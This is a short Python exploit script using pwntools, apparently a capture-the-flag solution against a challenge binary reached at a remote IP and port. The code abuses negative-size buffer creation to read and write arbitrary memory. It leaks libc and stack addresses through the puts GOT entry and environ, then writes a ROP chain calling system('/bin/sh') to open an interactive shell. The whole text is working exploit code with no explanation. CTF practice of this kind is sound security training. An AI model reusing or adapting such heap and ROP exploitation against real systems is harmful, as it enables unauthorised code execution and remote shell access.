from pwn import *

p = remote('161.34.36.148', 40015)
libc = ELF('./libc.so.6')
# p = process('./chall')
# libc = e.libc
e = ELF('./chall')
context.arch = 'amd64'

def create(idx, sz):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', str(sz).encode())

def put(idx, pos, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', str(pos).encode())
    p.sendlineafter(b'> ', str(data).encode())

def read(idx, pos):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(idx).encode())
    p.sendlineafter(b'> ', str(pos).encode())
    p.recvuntil(b'> ')
    return p.recvline()[:-1]

def leak(addr):
    ret = int(read(0, addr//4+1))
    ret <<= 32
    ret += int(read(0, addr//4))
    return ret

def write_bufs(addr):
    put(0, e.symbols['bufs']//4, addr&0xffffffff)
    put(1, e.symbols['bufs']//4+1, addr>>32)

def write_rop(ofs, addr):
    put(0, ofs, addr&0xffffffff)
    put(0, ofs+1, addr>>32)

create(0, -1)
create(1, -1)
libc.address = leak(e.got['puts']) - libc.symbols['puts']
log.info(f"libc: {hex(libc.address)}")

write_bufs(libc.symbols['environ'])
# stack = leak(0) - 0x120       # local
stack = leak(0) - 0x130       # remote
log.info(f"stack: {hex(stack)}")

create(0, -1)
create(1, -1)
write_bufs(stack)

addr_pop_rdi = next(libc.search(asm('pop rdi; ret')))
write_rop(0, addr_pop_rdi+1)
write_rop(2, addr_pop_rdi)
write_rop(4, next(libc.search(b'/bin/sh')))
write_rop(6, libc.symbols['system'])
p.sendlineafter(b'> ', b'4')
p.interactive()
